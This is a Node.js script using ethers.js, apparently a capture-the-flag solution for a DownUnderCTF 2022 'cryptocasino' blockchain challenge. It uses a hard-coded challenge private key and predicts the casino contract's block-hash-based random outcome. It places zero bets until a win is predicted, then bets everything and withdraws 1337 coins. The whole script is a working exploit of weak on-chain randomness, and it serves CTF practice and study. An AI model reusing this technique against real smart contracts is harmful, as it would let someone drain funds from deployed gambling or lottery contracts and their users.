const { ethers } = require("ethers");

const overrides = {
	gasLimit: 500000
};

const rpc_endpoint = "https://blockchain-cryptocasino-b9f898ef7e97ef13-eth.2022.ductf.dev/";
const private_key = "0x4260a821b6fe99cf510e3e1306bfdae4798f40b4f82fd00ee7d676f58a070858";
const wallet_addr = "0xBD34C2FD5De12BB6e659580c53d441C2DF246D23";
const ducoin_addr = "0x964f7C663a376Ec2537aDb68eEeb805A98F6eD41";
const casino_addr = "0xab5735Ce2dc2752c70f93bBf70a86C91B5508e98";

const ducoin_abi = [
	"function approve(address _spender, uint256 _value) public returns (bool success)",
];

const casino_abi = [
	"function approve(address _spender, uint256 _value) public returns (bool success)",
	"function deposit(uint256 amount)",
	"function withdraw(uint256 amount)",
	"function play(uint256 bet)",
	"function getTrialCoins()",
	"function balances(address) public view returns(uint256)"
];

const provider = new ethers.providers.JsonRpcProvider(rpc_endpoint, 31337);
const signer = new ethers.Wallet(private_key, provider);

const ducoin_contract = new ethers.Contract(ducoin_addr, ducoin_abi, signer);
const casino_contract = new ethers.Contract(casino_addr, casino_abi, signer);

(async () => {
	let tx;

	tx = await ducoin_contract.approve(casino_addr, 10000, overrides);
	tx.wait();

	tx = await casino_contract.getTrialCoins(overrides);
	tx.wait();

	tx = await casino_contract.deposit(7, overrides);
	tx.wait();

	let balance = await casino_contract.balances(wallet_addr, overrides);

	console.log("balance = " + balance);

	while (balance < 1337) {
		const blockNumber = await provider.getBlockNumber();
		const block = await provider.getBlock(blockNumber);
		const a = BigInt(block.hash) & 0xffffffffn;
		const b = (BigInt(block.hash) >> 32n) & 0xffffffffn;

		console.log(`block ${blockNumber}, hash ${block.hash}`);

		if (a % 6n == 0n && b % 6n == 0n) {
			// if this holds true for the current block, the casino LCG will yield
			// zero for the next bet, therefore placing an all-in bet here.

			console.log(`next bet wins -> place ${balance} coins`);

			await casino_contract.play(balance, overrides);
			balance = await casino_contract.balances(wallet_addr, overrides);

			console.log("balance = " + balance);

		} else {
			// placing a zero bet here to create next block without loosing any coins.

			await casino_contract.play(0, overrides);
		}
	}

	tx = await casino_contract.withdraw(1337, overrides);
	tx.wait();
})();

